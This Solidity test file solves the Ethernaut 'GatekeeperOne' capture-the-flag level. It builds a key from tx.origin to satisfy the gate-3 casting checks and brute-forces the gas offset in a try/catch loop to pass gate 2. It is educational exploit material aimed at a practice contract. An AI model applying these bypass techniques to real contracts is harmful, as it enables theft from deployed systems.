pragma solidity ^0.8.10;

import "ds-test/test.sol";
import "../GatekeeperOne/GatekeeperOneHack.sol";
import "../GatekeeperOne/GatekeeperOneFactory.sol";
import "../Ethernaut.sol";
import "./utils/vm.sol";

contract GatekeeperOneTest is DSTest {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    Ethernaut ethernaut;

    function setUp() public {
        // Setup instance of the Ethernaut contracts
        ethernaut = new Ethernaut();
    }

    function testGatekeeperOneHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        GatekeeperOneFactory gatekeeperOneFactory = new GatekeeperOneFactory();
        ethernaut.registerLevel(gatekeeperOneFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(gatekeeperOneFactory);
        GatekeeperOne ethernautGatekeeperOne = GatekeeperOne(payable(levelAddress));
        vm.stopPrank();

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // Create GatekeeperOneHack contract
        GatekeeperOneHack gatekeeperOneHack = new GatekeeperOneHack(levelAddress);

        // Need at 8 byte key that matches the conditions for gate 3 - we start from the fixed value - uint16(uint160(tx.origin) - then work out what the key needs to be
        bytes4 halfKey = bytes4(bytes.concat(bytes2(uint16(0)),bytes2(uint16(uint160(tx.origin)))));
        // key = "0x0000ea720000ea72"
        bytes8 key = bytes8(bytes.concat(halfKey, halfKey));

        // View emitted values and compare them to the requires in Gatekeeper One
        emit log_named_uint("Gate 3 all requires", uint32(uint64(key)));
        emit log_named_uint("Gate 3 first require", uint16(uint64(key)));
        emit log_named_uint("Gate 3 second require", uint64(key));
        emit log_named_uint("Gate 3 third require", uint16(uint160(tx.origin)));

        // Loop through a until correct gas is found, use try catch to get arounf the revert
        for (uint i = 0; i <= 8191; i++) {
            try ethernautGatekeeperOne.enter{gas: 73990+i}(key) {
                emit log_named_uint("Pass - Gas", 73990+i);
                break;
            } catch {
                emit log_named_uint("Fail - Gas", 73990+i);
            }
        }
        
        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        vm.startPrank(tx.origin);
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}